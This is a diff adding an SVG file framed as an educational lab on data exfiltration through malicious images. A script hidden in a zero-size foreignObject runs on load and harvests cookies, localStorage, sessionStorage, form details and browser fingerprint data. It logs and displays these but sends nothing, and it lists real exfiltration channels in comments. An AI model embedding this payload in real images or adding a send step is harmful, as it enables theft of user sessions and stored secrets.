@@ -1,0 +1,169 @@
+<!-- 
+  EDUCATIONAL SVG SECURITY LAB - DATA EXFILTRATION DEMONSTRATION
+  ⚠️ WARNING: This is a synthetic educational example only.
+  Do not use against real systems without authorization.
+  
+  This file demonstrates advanced data exfiltration techniques
+  that could be used by malicious SVG files to steal sensitive information.
+-->
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300" viewBox="0 0 400 300">
+  <!-- Visual elements to make the SVG appear legitimate -->
+  <rect width="400" height="300" fill="#fff0f5"/>
+  <circle cx="200" cy="150" r="80" fill="#ff1493" stroke="#c71585" stroke-width="3"/>
+  <text x="200" y="160" text-anchor="middle" font-family="Arial, sans-serif" font-size="20" fill="white" font-weight="bold">
+    DATA EXFIL
+  </text>
+  <text x="200" y="180" text-anchor="middle" font-family="Arial, sans-serif" font-size="12" fill="#333">
+    Advanced Techniques
+  </text>
+  
+  <!-- EDUCATIONAL DEMONSTRATION: This shows advanced data exfiltration -->
+  <foreignObject width="0" height="0">
+    <div xmlns="http://www.w3.org/1999/xhtml">
+      <script>
+        // SYNTHETIC DATA EXFILTRATION DEMO - FOR EDUCATIONAL PURPOSES ONLY
+        // This demonstrates advanced data exfiltration techniques
+        
+        console.log('[EDUCATIONAL DEMO] Advanced data exfiltration simulation started');
+        
+        // Simulate comprehensive data collection (harmless for educational purposes)
+        var comprehensiveData = {
+          timestamp: new Date().toISOString(),
+          demoType: 'Advanced Data Exfiltration',
+          
+          // Browser Information
+          browser: {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages,
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            onLine: navigator.onLine,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints
+          },
+          
+          // Screen Information
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+          },
+          
+          // Window Information
+          window: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            location: window.location.href,
+            referrer: document.referrer,
+            title: document.title
+          },
+          
+          // Storage Data
+          storage: {
+            cookies: document.cookie || 'No cookies',
+            localStorage: (function() {
+              var items = {};
+              for (var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                items[key] = localStorage.getItem(key);
+              }
+              return items;
+            })(),
+            sessionStorage: (function() {
+              var items = {};
+              for (var i = 0; i < sessionStorage.length; i++) {
+                var key = sessionStorage.key(i);
+                items[key] = sessionStorage.getItem(key);
+              }
+              return items;
+            })()
+          },
+          
+          // Form Data (simulated)
+          forms: (function() {
+            var formData = {};
+            var forms = document.forms;
+            for (var i = 0; i < forms.length; i++) {
+              var form = forms[i];
+              formData['form_' + i] = {
+                action: form.action,
+                method: form.method,
+                id: form.id,
+                name: form.name
+              };
+            }
+            return formData;
+          })(),
+          
+          // Network Information (simulated)
+          network: {
+            connection: navigator.connection ? {
+              effectiveType: navigator.connection.effectiveType,
+              downlink: navigator.connection.downlink,
+              rtt: navigator.connection.rtt
+            } : 'Not available'
+          }
+        };
+        
+        console.log('[EDUCATIONAL DEMO] Comprehensive data collected (synthetic):', comprehensiveData);
+        
+        // Display educational message about data exfiltration
+        var demoDiv = document.createElement('div');
+        demoDiv.style.cssText = 'position:fixed;top:10px;right:10px;background:#ff1493;color:white;padding:15px;border-radius:5px;z-index:9999;font-family:Arial;font-size:12px;max-width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.3);';
+        demoDiv.innerHTML = `
+          <strong>📊 EDUCATIONAL DEMO - Data Exfiltration</strong><br><br>
+          <strong>Data Categories Collected:</strong><br>
+          • Browser Info: ${Object.keys(comprehensiveData.browser).length} items<br>
+          • Screen Info: ${Object.keys(comprehensiveData.screen).length} items<br>
+          • Window Info: ${Object.keys(comprehensiveData.window).length} items<br>
+          • Storage Data: ${Object.keys(comprehensiveData.storage).length} categories<br>
+          • Form Data: ${Object.keys(comprehensiveData.forms).length} forms<br>
+          • Network Info: Available<br><br>
+          <small>⚠️ In a real attack, this data would be sent to an attacker's server.</small>
+        `;
+        document.body.appendChild(demoDiv);
+        
+        // Simulate different exfiltration methods
+        console.log('[EDUCATIONAL DEMO] Simulating various exfiltration methods...');
+        
+        // Method 1: Image requests (simulated)
+        console.log('[EDUCATIONAL DEMO] Method 1: Image request exfiltration (simulated)');
+        
+        // Method 2: Beacon API (simulated)
+        console.log('[EDUCATIONAL DEMO] Method 2: Beacon API exfiltration (simulated)');
+        
+        // Method 3: XMLHttpRequest (simulated)
+        console.log('[EDUCATIONAL DEMO] Method 3: XMLHttpRequest exfiltration (simulated)');
+        
+        // Method 4: Fetch API (simulated)
+        console.log('[EDUCATIONAL DEMO] Method 4: Fetch API exfiltration (simulated)');
+        
+        console.log('[EDUCATIONAL DEMO] Educational demo complete - no actual data was transmitted');
+        
+        // Remove the demo message after 10 seconds
+        setTimeout(function() {
+          if (demoDiv.parentNode) {
+            demoDiv.parentNode.removeChild(demoDiv);
+          }
+        }, 10000);
+        
+        // EDUCATIONAL NOTE: Real data exfiltration techniques include:
+        // - Image requests with data in URL parameters
+        // - Beacon API for reliable data transmission
+        // - XMLHttpRequest for complex data structures
+        // - Fetch API for modern browsers
+        // - WebSocket connections for real-time data
+        // - DNS exfiltration for bypassing firewalls
+        // - Timing attacks for sensitive data extraction
+        // - CSS-based data exfiltration
+      </script>
+    </div>
+  </foreignObject>
+</svg> 
